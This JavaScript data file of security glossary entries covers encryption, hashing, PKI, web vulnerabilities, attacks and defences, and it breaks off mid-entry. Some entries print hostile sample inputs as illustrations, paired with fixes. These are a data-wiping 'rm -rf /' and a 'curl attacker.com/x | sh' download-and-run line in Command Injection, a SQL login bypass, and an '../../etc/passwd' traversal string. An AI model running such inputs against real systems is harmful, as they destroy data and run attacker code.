TD.add("security", [

{t:"Encryption", d:"Transforming data so that only someone with the right key can read it.", l:"core", g:["cryptography","fundamentals"],
 b:["Encryption converts plaintext into ciphertext using an algorithm and a key. Without the key the ciphertext should be indistinguishable from random data. Security rests entirely on the key, never on the algorithm being secret — Kerckhoffs's principle, and the reason all serious cryptography is public and heavily reviewed.",
    "The two categories are symmetric (one shared key, fast) and asymmetric (a key pair, slow but solves key distribution). Real systems combine them: asymmetric to exchange a symmetric key, then symmetric for the actual data."],
 k:["Security depends on the key, never on the algorithm being secret.",
    "Never write your own cryptography — use vetted libraries.",
    "Encrypt in transit (TLS) and at rest; they solve different problems.",
    "Encrypted data is worthless if the key sits beside it."],
 dg:"encryption",
 r:["Symmetric Encryption","Asymmetric Encryption","TLS","Hashing","Key Management"]},

{t:"Symmetric Encryption", d:"Encryption where the same secret key both encrypts and decrypts.", l:"core", g:["cryptography"],
 b:["AES is the standard, typically AES-256 in GCM mode, which provides both confidentiality and authentication — it detects tampering as well as hiding content. ChaCha20-Poly1305 is the common alternative where hardware AES acceleration is unavailable.",
    "Symmetric encryption is fast enough for bulk data, which is why it protects everything from disk volumes to TLS sessions. Its one problem is distribution: both parties need the key, and getting it to them securely is exactly what asymmetric cryptography solves."],
 k:["AES-256-GCM is the default choice; it authenticates as well as encrypts.",
    "Fast enough for bulk data — used for the actual payload in TLS.",
    "Never reuse a nonce with the same key; it breaks the scheme completely.",
    "Key distribution is the problem it cannot solve on its own."],
 dg:"encryption",
 r:["Asymmetric Encryption","Encryption","TLS","Key Management"]},

{t:"Asymmetric Encryption", a:"Public Key Cryptography", d:"Encryption using a mathematically linked key pair: a public key anyone may hold and a private key that stays secret.", l:"core", g:["cryptography"],
 b:["Anything encrypted with the public key can only be decrypted with the private key, which solves key distribution — you can publish your public key freely. Reversing the operation gives digital signatures: signing with a private key proves possession, and anyone can verify with the public key.",
    "It is orders of magnitude slower than symmetric encryption, so it is used to establish a shared symmetric key rather than to encrypt bulk data. RSA and elliptic curve algorithms such as Ed25519 are the common families; ECC gives equivalent security with much smaller keys."],
 k:["Public key encrypts, private key decrypts — publish the public one freely.",
    "Reversed, it produces digital signatures.",
    "Far too slow for bulk data; used to exchange a symmetric key.",
    "Ed25519 offers RSA-3072 security in a 256-bit key."],
 dg:"encryption",
 r:["Symmetric Encryption","Digital Signature","Public Key Infrastructure","TLS","SSH"]},

{t:"Hashing", d:"Converting data of any size into a fixed-length fingerprint that cannot be reversed.", l:"core", g:["cryptography","fundamentals"],
 b:["A cryptographic hash is deterministic, fast to compute, infeasible to reverse, and changes completely if a single input bit changes. SHA-256 is the general-purpose standard, used for integrity checking, deduplication and content addressing.",
    "For passwords, speed is the enemy. Use bcrypt, scrypt or Argon2 — deliberately slow, memory-hard functions with a tunable work factor — because a fast hash lets an attacker try billions of candidate passwords per second against a stolen database."],
 k:["One-way, deterministic, fixed length, avalanche effect on any change.",
    "SHA-256 for integrity; never for passwords.",
    "Passwords need bcrypt, scrypt or Argon2 with a tuned cost factor.",
    "MD5 and SHA-1 are broken for security purposes."],
 dg:"hashing",
 r:["Salt","Encryption","Digital Signature","Authentication"]},

{t:"Salt", d:"Random data added to each password before hashing, so identical passwords produce different hashes.", l:"core", g:["cryptography","authentication"],
 b:["Without a salt, everyone who chose the same password has the same hash, and a precomputed rainbow table cracks all of them at once. A unique random salt per password makes precomputation useless — an attacker must attack each hash individually.",
    "The salt is not a secret and is stored alongside the hash; bcrypt and Argon2 embed it in their output automatically. A pepper is a separate application-wide secret stored outside the database, adding another layer if the database alone is stolen."],
 k:["Unique and random per password — never reused, never a constant.",
    "Stored with the hash; it is not secret.",
    "Defeats rainbow tables and cross-account hash matching.",
    "bcrypt and Argon2 generate and embed it for you."],
 dg:"hashing",
 x:{lang:"text",code:"no salt   password123 -> ef92b778...   (same for everyone)\n                                       one crack breaks every account\n\nsalted    password123 + \"a91f\" -> 7c4e...\n          password123 + \"3b7d\" -> 1f08...\n                                       every account must be attacked alone"},
 r:["Hashing","Authentication","Brute Force Attack"]},

{t:"Digital Signature", d:"A cryptographic proof that a message came from a specific private key holder and has not been altered.", l:"core", g:["cryptography"],
 b:["The signer hashes the message and encrypts the hash with their private key. Anyone can decrypt it with the corresponding public key and compare against their own hash of the message. A match proves both authenticity and integrity, and provides non-repudiation.",
    "Signatures underpin TLS certificates, software package signing, container image signing, JWT verification and blockchain transactions. Verifying a signature only proves the key was used — it says nothing about whether that key belongs to who you think, which is what certificate authorities exist to establish."],
 k:["Proves origin and integrity; provides non-repudiation.",
    "Sign the hash, not the whole message, for efficiency.",
    "Verification proves key possession, not identity — that needs PKI.",
    "Used for certificates, packages, container images and tokens."],
 r:["Asymmetric Encryption","Public Key Infrastructure","Certificate Authority","Hashing"]},

{t:"Public Key Infrastructure", a:"PKI", d:"The system of certificates, authorities and policies that binds public keys to verified identities.", l:"intermediate", g:["cryptography","infrastructure"],
 b:["A public key alone proves nothing about who owns it. PKI solves that with certificates: a certificate authority verifies an identity and signs a statement binding it to a public key. Browsers and operating systems ship with a set of trusted root authorities, and trust flows down the chain from there.",
    "The weakness is that any trusted authority can issue a certificate for any domain, so a single compromised or coerced CA undermines the whole system. Certificate transparency logs make misissuance publicly detectable."],
 k:["Certificates bind a public key to a verified identity.",
    "Trust chains from a root authority already trusted by the client.",
    "Any trusted CA can issue for any domain — a structural weakness.",
    "Certificate transparency logs make misissuance publicly visible."],
 r:["Certificate Authority","TLS","Digital Signature","Asymmetric Encryption"]},

{t:"Certificate Authority", a:"CA", d:"An organisation trusted to verify identities and issue signed certificates.", l:"intermediate", g:["cryptography","infrastructure"],
 b:["A CA validates that the requester controls a domain — usually by having them prove it via DNS or HTTP — and issues a signed certificate. Let's Encrypt made this free and fully automated through the ACME protocol, which is why HTTPS is now near-universal.",
    "Internal CAs issue certificates for private infrastructure, which is how service meshes implement mutual TLS. Certificate expiry remains one of the most common causes of self-inflicted outages, so automated renewal and expiry monitoring are essential."],
 k:["Validates control of a domain, then issues a signed certificate.",
    "Let's Encrypt automates issuance and renewal via ACME.",
    "Expired certificates are a leading cause of avoidable outages.",
    "Internal CAs issue certificates for service-to-service mTLS."],
 r:["Public Key Infrastructure","TLS","Digital Signature","HTTPS"]},

{t:"TLS", a:"Transport Layer Security", d:"The protocol that encrypts and authenticates traffic between two networked applications.", l:"core", g:["cryptography","protocol"],
 b:["TLS performs a handshake in which the parties agree on a cipher suite, the server proves its identity with a certificate, and they establish a shared symmetric key. Everything after that is encrypted and integrity-protected with that key.",
    "TLS 1.3 removed the legacy insecure options, cut the handshake to a single round trip, and made forward secrecy mandatory — so a later compromise of the server's private key cannot decrypt previously captured traffic. SSL is the obsolete predecessor; the name persists but the protocols are all disabled."],
 k:["Handshake establishes identity and a shared symmetric key.",
    "TLS 1.3 is 1-RTT, with forward secrecy required.",
    "Forward secrecy means past traffic stays safe if the key later leaks.",
    "SSL is dead; TLS 1.0 and 1.1 are deprecated and should be disabled."],
 r:["HTTPS","Certificate Authority","Symmetric Encryption","Asymmetric Encryption","QUIC"]},

{t:"End-to-End Encryption", a:"E2EE", d:"Encryption where only the communicating endpoints can read the content — not even the service carrying it.", l:"intermediate", g:["cryptography","privacy"],
 b:["With ordinary TLS, the server decrypts your message to process and store it, so the provider can read it. With end-to-end encryption the keys never leave the endpoints, so the server relays ciphertext it cannot decrypt. Signal, WhatsApp and encrypted backup services work this way.",
    "The trade-offs are real: the provider cannot search content, cannot recover data if the user loses their keys, and cannot scan for abuse. Key verification also becomes the user's responsibility, since a malicious server could otherwise substitute its own key."],
 k:["Only endpoints hold keys — the service relays ciphertext it cannot read.",
    "Lost keys mean permanently lost data; the provider cannot help.",
    "Server-side search and processing become impossible.",
    "Users must verify keys, or a malicious server can substitute its own."],
 r:["Encryption","Asymmetric Encryption","Key Management"]},

{t:"Key Management", d:"Generating, storing, rotating, distributing and destroying cryptographic keys safely.", l:"intermediate", g:["cryptography","operations"],
 b:["Encryption is only as strong as key handling. Keys must be generated with a cryptographically secure random source, stored where the application can use them but an attacker cannot read them, rotated on a schedule, and destroyed when retired.",
    "The standard approach is envelope encryption: a data key encrypts the data, and a master key held in a KMS or HSM encrypts the data key. That means rotating the master key does not require re-encrypting terabytes of data. Keys must never appear in source control, logs or environment dumps."],
 k:["Envelope encryption: master key wraps data keys, so rotation is cheap.",
    "Use a KMS or HSM — never store keys in code or configuration files.",
    "Rotate on a schedule and immediately on any suspected compromise.",
    "Keys in git history persist forever, even after deletion."],
 r:["Encryption","Secrets Management","Hardware Security Module","Symmetric Encryption"]},

{t:"Secrets Management", d:"Storing and distributing credentials, keys and tokens without exposing them.", l:"core", g:["operations","security"],
 b:["Secrets belong in a dedicated store — HashiCorp Vault, AWS Secrets Manager, Azure Key Vault — that encrypts at rest, controls access per identity, logs every retrieval, and supports rotation. Applications fetch them at startup or on demand rather than reading them from a committed file.",
    "The most common failure is a secret committed to git. Because history is permanent, rotating the secret is the only real remediation — deleting the file does not help. Pre-commit hooks and repository scanning catch these before they are pushed."],
 k:["Use a dedicated secret store with per-identity access control and audit logging.",
    "A committed secret must be rotated — deleting it from HEAD does nothing.",
    "Prefer short-lived dynamic credentials over long-lived static ones.",
    "Scan repositories and pre-commit for accidental secrets."],
 r:["Key Management","Configuration Management","Principle of Least Privilege","Twelve-Factor App"]},

{t:"Hardware Security Module", a:"HSM", d:"A tamper-resistant hardware device that generates and stores cryptographic keys and performs operations without ever exposing them.", l:"advanced", g:["cryptography","infrastructure"],
 b:["An HSM performs signing and decryption internally; the key never leaves the device in usable form, and physical tampering triggers erasure. Certificate authorities, payment processors and any system under FIPS 140 requirements use them.",
    "Cloud providers offer managed HSM services, which give the same guarantee without operating the hardware. A software KMS is sufficient for most applications; HSMs are for the highest-value keys where physical extraction is a credible threat."],
 k:["Keys are generated inside and never leave in usable form.",
    "Tamper-resistant: physical attack triggers key destruction.",
    "Required by FIPS 140 and payment card standards.",
    "Cloud managed HSMs give the guarantee without the hardware operations."],
 r:["Key Management","Encryption","Digital Signature","Certificate Authority"]},

{t:"SQL Injection", d:"An attack where user input is interpreted as SQL, letting an attacker read or destroy data.", l:"core", g:["vulnerability","web"],
 b:["It happens whenever untrusted input is concatenated into a query string. Entering `' OR '1'='1` into a login form turns the WHERE clause into something always true. More damaging variants read other tables, exfiltrate the whole database, or in some configurations write files and execute commands.",
    "The fix is not sanitising harder — it is never building queries by concatenation. Parameterised queries send the SQL and the values separately, so the database treats input as data and it can never become code. This has been the known correct answer for over twenty years and the vulnerability still appears constantly."],
 k:["Caused by concatenating input into SQL — never by input itself.",
    "Parameterised queries make it structurally impossible.",
    "Escaping and blocklists are unreliable; parameterisation is not.",
    "Least-privilege database accounts limit the damage when it does happen."],
 x:{lang:"python", code:'# vulnerable\ncur.execute(f"SELECT * FROM users WHERE email = \'{email}\'")\n\n# safe — the driver never mixes SQL and data\ncur.execute("SELECT * FROM users WHERE email = %s", (email,))\n\n# safe with an ORM\nsession.query(User).filter(User.email == email).one_or_none()'},
 dg:"xss-injection",
 r:["Cross-Site Scripting","Command Injection","OWASP Top 10","Principle of Least Privilege"]},

{t:"Cross-Site Scripting", a:"XSS", d:"An attack where an attacker's JavaScript executes in another user's browser in the context of your site.", l:"core", g:["vulnerability","web"],
 b:["Stored XSS persists the payload in your database — a comment containing a script tag — and executes for everyone who views it. Reflected XSS bounces the payload back from a URL parameter. DOM-based XSS never touches the server, occurring entirely in client-side code that writes untrusted data into the page.",
    "Because the script runs with your site's origin, it can read cookies not marked HttpOnly, make authenticated requests, and rewrite the page. Defences: escape on output according to context, use framework auto-escaping, avoid `innerHTML`, and deploy a strict Content Security Policy."],
 k:["Stored, reflected and DOM-based are three distinct variants.",
    "Escape on output, contextually — HTML, attribute, URL and JS differ.",
    "Avoid `innerHTML` and `dangerouslySetInnerHTML`.",
    "CSP blocks the payload even when an injection flaw exists."],
 dg:"xss-injection",
 r:["Content Security Policy","SQL Injection","Cookie","Same-Origin Policy","OWASP Top 10"]},

{t:"Cross-Site Request Forgery", a:"CSRF", d:"Tricking a logged-in user's browser into making an unintended authenticated request.", l:"core", g:["vulnerability","web"],
 b:["Because browsers attach cookies automatically, a form on an attacker's page can submit to your site and the request arrives fully authenticated. The user never sees it. The classic result is a state-changing action — transfer funds, change email — performed without consent.",
    "The defences are anti-CSRF tokens, which the attacker's page cannot read due to the same-origin policy, and `SameSite` cookie attributes, which stop the browser attaching cookies to cross-site requests at all. `SameSite=Lax` is now the browser default and eliminates most of the risk."],
 k:["Exploits automatic cookie attachment, not any flaw in your code.",
    "`SameSite=Lax` or `Strict` cookies block most of it.",
    "Anti-CSRF tokens are the belt-and-braces defence.",
    "Only affects cookie-based auth — bearer tokens in headers are not vulnerable."],
 r:["Cookie","Same-Origin Policy","Session","OWASP Top 10"]},

{t:"Server-Side Request Forgery", a:"SSRF", d:"Tricking a server into making requests to destinations the attacker chooses.", l:"intermediate", g:["vulnerability","web"],
 b:["Any feature that fetches a user-supplied URL — a webhook, an image importer, a PDF renderer — can be pointed at internal addresses. In cloud environments the classic target is the metadata endpoint at 169.254.169.254, which can return instance credentials.",
    "Blocklists of private ranges are routinely bypassed with DNS rebinding, redirects and alternative IP encodings. The robust defences are an allowlist of permitted destinations, network-level egress restrictions, and requiring IMDSv2 which is not vulnerable to simple SSRF."],
 k:["Cloud metadata endpoints are the highest-value target.",
    "Blocklists are bypassable; use allowlists.",
    "Validate the resolved IP, not just the hostname, and re-check after redirects.",
    "Egress firewall rules limit the damage regardless of application flaws."],
 r:["OWASP Top 10","Firewall","Virtual Private Cloud","Command Injection"]},

{t:"Command Injection", d:"An attack where user input is executed as operating system commands.", l:"core", g:["vulnerability"],
 b:["Passing untrusted input to a shell — through `system()`, `exec` with `shell=True`, or backticks — lets an attacker append `; rm -rf /` or `&& curl attacker.com/x | sh`. The consequence is arbitrary code execution as the application user, which is generally the worst outcome available.",
    "The fix is never invoking a shell. Pass the program and its arguments as an array so the OS executes it directly with no shell parsing. If a shell genuinely cannot be avoided, use an allowlist of permitted values rather than trying to escape."],
 k:["Never pass user input to a shell — use argument arrays instead.",
    "`subprocess.run([...])` without `shell=True` is safe by construction.",
    "Escaping shell metacharacters correctly is harder than it looks.",
    "Run application processes with minimal OS privileges."],
 x:{lang:"python", code:'# vulnerable\nos.system(f"convert {filename} out.png")\n\n# safe — no shell involved, no metacharacter parsing\nsubprocess.run(["convert", filename, "out.png"], check=True)'},
 r:["SQL Injection","Principle of Least Privilege","OWASP Top 10","Sandboxing"]},

{t:"Path Traversal", a:"Directory Traversal", d:"Using relative path sequences in user input to read or write files outside the intended directory.", l:"intermediate", g:["vulnerability"],
 b:["A file download endpoint that concatenates a user-supplied name onto a base directory can be given `../../etc/passwd`. Variants use URL encoding, double encoding, null bytes or absolute paths to evade naive filtering.",
    "The reliable defence is to resolve the final path and verify it still lies within the permitted directory, rather than trying to strip dangerous sequences. Better still, do not accept file paths at all — accept an identifier and map it to a path server-side."],
 k:["Resolve the final canonical path and verify it is inside the allowed root.",
    "Stripping `../` is bypassable through encoding and nesting.",
    "Prefer mapping an opaque id to a path over accepting paths.",
    "Applies to uploads and archive extraction too — the zip slip variant."],
 r:["Command Injection","OWASP Top 10","File Permissions","Sandboxing"]},

{t:"Insecure Direct Object Reference", a:"IDOR", d:"Exposing an internal identifier without checking that the caller is allowed to access that specific object.", l:"core", g:["vulnerability","authorisation"],
 b:["An endpoint like `/api/invoices/1042` that returns the invoice without verifying it belongs to the authenticated user lets anyone enumerate every invoice by changing the number. It is authentication working correctly and authorisation missing entirely.",
    "It is consistently among the most common and most damaging real-world vulnerabilities, precisely because it requires no technical skill to exploit. Using UUIDs makes enumeration harder but is not a fix — the authorisation check is the fix."],
 k:["Authorisation must be checked per object, not just per endpoint.",
    "Sequential ids make enumeration trivial; UUIDs obscure but do not protect.",
    "Check ownership in the query itself: `WHERE id = ? AND owner_id = ?`.",
    "Consistently one of the most exploited vulnerability classes."],
 r:["Authorisation","OWASP Top 10","Role-Based Access Control","API"]},

{t:"Buffer Overflow", d:"Writing past the end of an allocated memory region, corrupting adjacent data or control structures.", l:"intermediate", g:["vulnerability","low-level"],
 b:["In languages without bounds checking, copying 200 bytes into a 100-byte buffer overwrites whatever follows. If that includes a return address, an attacker can redirect execution to code of their choosing — the classic route to remote code execution.",
    "Modern mitigations — stack canaries, address space layout randomisation, non-executable stacks — raise the difficulty considerably without eliminating the class. Memory-safe languages eliminate it entirely, which is why agencies now recommend them for new critical software."],
 k:["Only possible in languages without bounds checking, chiefly C and C++.",
    "Can lead directly to arbitrary code execution.",
    "ASLR, stack canaries and NX raise difficulty but do not remove the class.",
    "Rust, Go, Java and Python are structurally immune."],
 r:["Memory Safety","C","Integer Overflow","Rust"]},

{t:"Deserialisation Attack", d:"Exploiting a program that reconstructs objects from untrusted serialised data.", l:"advanced", g:["vulnerability"],
 b:["Formats that can instantiate arbitrary classes and invoke methods during deserialisation — Python's pickle, Java's native serialisation, PHP's unserialize, unsafe YAML loading — allow a crafted payload to execute code during the parse itself, before any validation runs.",
    "The rule is absolute: never deserialise untrusted data with these formats. Use a data-only format such as JSON, and validate the resulting structure against a schema before using it."],
 k:["Code executes during parsing, before any of your validation runs.",
    "pickle, Java serialisation, PHP unserialize and `yaml.load` are all dangerous.",
    "Use JSON or another data-only format for anything untrusted.",
    "Signing serialised data authenticates it but does not make the format safe."],
 r:["Serialisation","OWASP Top 10","Command Injection","JSON"]},

{t:"OWASP Top 10", d:"A regularly updated list of the most critical web application security risks.", l:"core", g:["standard","practice"],
 b:["The list is compiled from real-world vulnerability data and serves as the industry's shared checklist. Recent editions place broken access control first, followed by cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, authentication failures, integrity failures, logging failures and SSRF.",
    "It is a starting point rather than a complete programme — it covers common risks, not the specific threats of your particular system, which is what threat modelling addresses. There are separate Top 10 lists for APIs and for LLM applications."],
 k:["Broken access control is consistently the number one risk.",
    "Derived from real vulnerability data, updated every few years.",
    "A baseline checklist, not a substitute for threat modelling.",
    "Separate lists exist for APIs, mobile and LLM applications."],
 r:["SQL Injection","Cross-Site Scripting","Insecure Direct Object Reference","Threat Modelling","Security Misconfiguration"]},

{t:"Zero Trust", d:"A security model that assumes no network location is inherently trustworthy and verifies every request.", l:"intermediate", g:["architecture","security"],
 b:["The traditional model trusted anything inside the network perimeter, so one compromised laptop gave an attacker free movement. Zero trust removes that assumption: every request is authenticated and authorised on its own merits regardless of origin, using device posture, user identity and context.",
    "In practice it means mutual TLS between services, identity-aware proxies instead of VPNs, short-lived credentials, per-request authorisation and micro-segmentation. The phrase is never trust, always verify."],
 k:["Network location grants no trust — verify every request.",
    "Identity-aware proxies replace perimeter VPNs.",
    "Short-lived credentials and continuous verification, not one-time login.",
    "Micro-segmentation limits lateral movement after a compromise."],
 r:["Authentication","Principle of Least Privilege","VPN","Service Mesh","Multi-Factor Authentication"]},

{t:"Principle of Least Privilege", d:"Granting every user, service and process only the permissions it actually needs.", l:"core", g:["principle","security"],
 b:["A service that only reads from one table should have exactly that permission, not database ownership. The point is blast radius: when something is compromised — and eventually something is — the damage is bounded by what that identity could do.",
    "It applies everywhere: database roles, cloud IAM policies, container users, API scopes, file permissions. The practical difficulty is that it requires ongoing attention, since permissions accumulate as people move roles and services gain features."],
 k:["Bounds the damage of any single compromise.",
    "Applies to database roles, IAM, containers, API scopes and files.",
    "Permissions accumulate — audit and revoke regularly.",
    "Prefer time-limited elevation over standing administrative access."],
 r:["Role-Based Access Control","Authorisation","Zero Trust","DCL","Secrets Management"]},

{t:"Role-Based Access Control", a:"RBAC", d:"Assigning permissions to roles and roles to users, rather than granting permissions directly.", l:"core", g:["authorisation","security"],
 b:["Roles group permissions by job function — viewer, editor, administrator. Users receive roles, and changing what a job function can do means editing one role rather than auditing every individual account. It is the standard model in Kubernetes, cloud IAM and most applications.",
    "Its limitation is context: RBAC cannot express rules like editors may only modify documents in their own department during business hours. Attribute-based access control handles that by evaluating policies against attributes of user, resource and environment."],
 k:["Permissions attach to roles; users receive roles.",
    "Changing a role updates every holder at once.",
    "Cannot express context-dependent rules — that needs ABAC.",
    "Role explosion is the common failure: hundreds of near-identical roles."],
 r:["Authorisation","Principle of Least Privilege","Zero Trust","Kubernetes"]},

{t:"Defence in Depth", d:"Layering multiple independent security controls so no single failure results in compromise.", l:"core", g:["principle","security"],
 b:["No single control is reliable. Defence in depth assumes each layer will eventually fail and ensures another stands behind it: a web application firewall, then input validation, then parameterised queries, then a least-privilege database account, then encryption at rest, then monitoring that detects unusual access.",
    "The layers must be genuinely independent. Five controls that all depend on the same authentication check are one control with five names."],
 k:["Assume every individual control will eventually fail.",
    "Layers must be independent or they fail together.",
    "Prevention, detection and response are all necessary layers.",
    "Applies at network, host, application and data levels."],
 r:["Principle of Least Privilege","Zero Trust","Threat Modelling","Content Security Policy"]},

{t:"Multi-Factor Authentication", a:"MFA / 2FA", d:"Requiring two or more independent kinds of evidence to authenticate.", l:"core", g:["authentication","security"],
 b:["The factors are something you know (a password), something you have (a phone, a hardware key) and something you are (a fingerprint). Requiring two from different categories means a stolen password alone is insufficient, which stops credential stuffing and most phishing.",
    "The factors are not equal. SMS codes can be intercepted through SIM swapping; time-based codes from an app are much better; hardware security keys using FIDO2 are phishing-resistant by design because the key verifies the site's origin cryptographically."],
 k:["Two factors from different categories, not two passwords.",
    "SMS is the weakest factor — SIM swapping is a real and common attack.",
    "FIDO2 hardware keys and passkeys are phishing-resistant by construction.",
    "The single highest-value security control most organisations can deploy."],
 r:["Authentication","Phishing","Credential Stuffing","Zero Trust"]},

{t:"Brute Force Attack", d:"Systematically trying every possible credential until one works.", l:"core", g:["attack","authentication"],
 b:["Brute force is limited by how fast attempts can be made and how large the search space is. Online attacks against a login endpoint are slowed by rate limiting, lockouts and CAPTCHAs. Offline attacks against a stolen password database are limited only by hardware — which is why slow password hashes matter so much.",
    "A modern GPU can compute billions of SHA-256 hashes per second and only thousands of bcrypt hashes at a reasonable work factor. That difference is the entire defence once a database is stolen."],
 k:["Rate limiting and lockouts defeat online brute forcing.",
    "Offline attacks against stolen hashes are limited only by hash cost.",
    "bcrypt and Argon2 make offline cracking millions of times slower.",
    "Long passphrases beat short complex passwords on search space alone."],
 r:["Hashing","Salt","Rate Limiting","Credential Stuffing","Multi-Factor Authentication"]},

{t:"Credential Stuffing", d:"Using username and password pairs stolen from one breach to log into other services.", l:"core", g:["attack","authentication"],
 b:["Because people reuse passwords, a set of credentials leaked from one site works on many others. Attackers automate this at scale against login endpoints, and because the credentials are valid the attempts look like ordinary logins rather than brute force.",
    "Defences are MFA (which makes valid credentials insufficient), checking passwords against known breach corpora at registration, device fingerprinting and anomaly detection, and rate limiting per account rather than only per IP address."],
 k:["Uses valid credentials, so it does not look like brute forcing.",
    "MFA defeats it almost entirely.",
    "Check new passwords against breach corpora such as Have I Been Pwned.",
    "Rate limit per account, since attackers rotate IP addresses."],
 r:["Brute Force Attack","Multi-Factor Authentication","Rate Limiting","Data Breach"]},

{t:"Phishing", d:"Deceiving someone into revealing credentials or performing an action by impersonating a trusted party.", l:"core", g:["attack","social"],
 b:["Phishing remains the most common initial access vector in real breaches, because it targets people rather than software. Spear phishing is tailored to a specific individual using researched details; business email compromise impersonates an executive to authorise a payment.",
    "Training helps but never eliminates it — well-crafted phishing fools careful people. The structural defence is phishing-resistant authentication: FIDO2 keys and passkeys verify the site's origin cryptographically, so a convincing fake site simply cannot obtain a usable credential."],
 k:["The most common initial access vector in real-world breaches.",
    "Training reduces but never eliminates the risk.",
    "FIDO2 and passkeys are phishing-resistant by design.",
    "Make it easy and blameless to report suspected phishing."],
 r:["Social Engineering","Multi-Factor Authentication","Credential Stuffing","Security Awareness"]},

{t:"Social Engineering", d:"Manipulating people into breaking security procedures, rather than attacking technology.", l:"intermediate", g:["attack","social"],
 b:["Social engineering exploits helpfulness, authority, urgency and fear. Pretexting invents a scenario, baiting offers something desirable, tailgating follows someone through a door. Help desk manipulation — persuading support to reset MFA for an account — has been behind several major breaches.",
    "Technical controls do not prevent it, so the defences are procedural: verified identity checks for sensitive requests, out-of-band confirmation for payments and account changes, and a culture where verifying an unusual request is expected rather than rude."],
 k:["Attacks the person, not the system.",
    "Urgency and authority are the standard manipulation levers.",
    "Help desk MFA resets are a repeatedly exploited weak point.",
    "Require out-of-band verification for payments and account recovery."],
 r:["Phishing","Multi-Factor Authentication","Security Awareness","Zero Trust"]},

{t:"Malware", d:"Software written to damage, disrupt or gain unauthorised access to a system.", l:"core", g:["attack","threat"],
 b:["The categories overlap: viruses attach to files, worms spread themselves across networks, trojans masquerade as legitimate software, spyware exfiltrates data, rootkits hide at a privileged level, and ransomware encrypts data for extortion.",
    "Signature-based detection catches known samples; behavioural detection catches novel ones by what they do. Application allowlisting, least privilege, patching and network segmentation limit both infection and spread."],
 k:["Virus, worm, trojan, spyware, rootkit and ransomware are the main families.",
    "Signature detection misses novel samples; behavioural detection is needed too.",
    "Least privilege limits what malware can do once it runs.",
    "Network segmentation limits how far it spreads."],
 r:["Ransomware","Supply Chain Attack","Sandboxing","Principle of Least Privilege"]},

{t:"Ransomware", d:"Malware that encrypts a victim's data and demands payment for the decryption key.", l:"core", g:["attack","threat"],
 b:["Modern ransomware operations first exfiltrate data, then encrypt — so refusing to pay still risks publication. They deliberately target backups, and often dwell in the network for weeks first, escalating privileges and mapping systems before triggering encryption.",
    "The defences that actually work are immutable, offline or air-gapped backups that ransomware cannot reach, tested restore procedures, network segmentation, MFA everywhere, and rapid patching of internet-facing systems."],
 k:["Double extortion: data is stolen before encryption, so paying is no guarantee.",
    "Backups are targeted first — they must be immutable or offline.",
    "Attackers typically dwell for weeks before triggering.",
    "Tested restores are the only reliable recovery path."],
 r:["Malware","Backup","Disaster Recovery","Multi-Factor Authentication","Incident Response"]},

{t:"Denial of Service", a:"DoS / DDoS", d:"An attack that makes a service unavailable by exhausting its resources.", l:"core", g:["attack","availability"],
 b:["A distributed denial of service uses many compromised machines to generate overwhelming traffic. Volumetric attacks saturate bandwidth, protocol attacks exhaust connection state, and application-layer attacks send small numbers of expensive requests that consume CPU or database capacity.",
    "Application-layer attacks are the hardest to distinguish from real traffic. Defences include CDN and scrubbing services that absorb volume, rate limiting, caching, query cost limits, and autoscaling — though autoscaling alone converts an availability problem into a billing one."],
 k:["Volumetric, protocol and application-layer attacks need different defences.",
    "Application-layer attacks are hardest to distinguish from legitimate traffic.",
    "CDNs and scrubbing services absorb volumetric attacks.",
    "Autoscaling without spend limits turns an outage into a bill."],
 r:["Rate Limiting","CDN","Load Balancer","Hash Collision","High Availability"]},

{t:"Man-in-the-Middle Attack", a:"MITM", d:"Intercepting communication between two parties who believe they are talking directly.", l:"intermediate", g:["attack","networking"],
 b:["An attacker positioned on the network path — a hostile Wi-Fi hotspot, a compromised router, DNS or ARP poisoning — can read and modify traffic. Without encryption this is trivial; with TLS it requires either a fraudulent certificate or persuading the client to accept one.",
    "This is exactly what certificate validation prevents, which is why disabling certificate verification to make an error go away is genuinely dangerous. Certificate pinning and HSTS add further protection."],
 k:["Requires a network position on the path between the parties.",
    "TLS with proper certificate validation prevents it.",
    "Never disable certificate verification to silence an error.",
    "HSTS and certificate pinning add defence in depth."],
 r:["TLS","Certificate Authority","HTTPS","VPN","Public Key Infrastructure"]},

{t:"Supply Chain Attack", d:"Compromising a target indirectly by attacking a supplier, dependency or build system it trusts.", l:"core", g:["attack","threat"],
 b:["Rather than attacking a hardened target, attackers compromise something it depends on: a popular npm package, a build tool, a vendor's update mechanism. SolarWinds, event-stream and xz-utils are the well-known cases, and all reached far more victims than a direct attack could.",
    "Defences: pin dependencies with lock files, verify integrity hashes and signatures, minimise dependency count, scan continuously for known vulnerabilities, generate a software bill of materials, and review what post-install scripts your dependencies run."],
 k:["Attacks the weakest supplier, not the hardest target.",
    "Lock files and integrity hashes prevent silent substitution.",
    "An SBOM tells you what you actually depend on.",
    "Every dependency is code you are running but did not review."],
 r:["Package Manager","npm","Container Registry","Dependency Confusion","CVE"]},

{t:"Dependency Confusion", d:"An attack that tricks a package manager into installing a public package instead of a private internal one.", l:"intermediate", g:["attack","supply-chain"],
 b:["If an organisation has an internal package named `acme-utils` and the attacker publishes a package with the same name and a higher version to the public registry, a misconfigured resolver may prefer the public one — and its install scripts then run inside the build environment.",
    "The fixes are configuration: scope internal packages to an organisation namespace, configure the registry to never fall back to public for internal scopes, and reserve your internal names on public registries defensively."],
 k:["Public registry packages can shadow private ones on version precedence.",
    "Use scoped names and pin the registry per scope.",
    "Reserve internal package names publicly as a defensive measure.",
    "Install scripts execute with build-environment credentials."],
 r:["Supply Chain Attack","Package Manager","npm","CI/CD"]},

{t:"Zero-Day", d:"A vulnerability that is exploited before the vendor has released a fix.", l:"intermediate", g:["threat","vulnerability"],
 b:["The name refers to the number of days the vendor has had to respond. Zero-days are valuable and comparatively rare — most breaches use known vulnerabilities that were simply never patched, which is a far more addressable problem.",
    "Because you cannot patch what has no patch, the defence is architectural: least privilege, network segmentation, behavioural monitoring, and the ability to detect and contain an intrusion rather than only prevent it."],
 k:["No patch exists at the time of exploitation.",
    "Most real breaches use old unpatched vulnerabilities, not zero-days.",
    "Defence in depth and detection matter when prevention is impossible.",
    "Rapid patching after disclosure is the highest-value response."],
 r:["CVE","Vulnerability Scanning","Defence in Depth","Incident Response"]},

{t:"CVE", a:"Common Vulnerabilities and Exposures", d:"A public catalogue assigning a unique identifier to each disclosed vulnerability.", l:"core", g:["standard","vulnerability"],
 b:["A CVE identifier such as CVE-2021-44228 (Log4Shell) gives everyone a common reference for a specific vulnerability, so advisories, scanners and patches can all point to the same thing. CVSS scores rate severity from 0 to 10.",
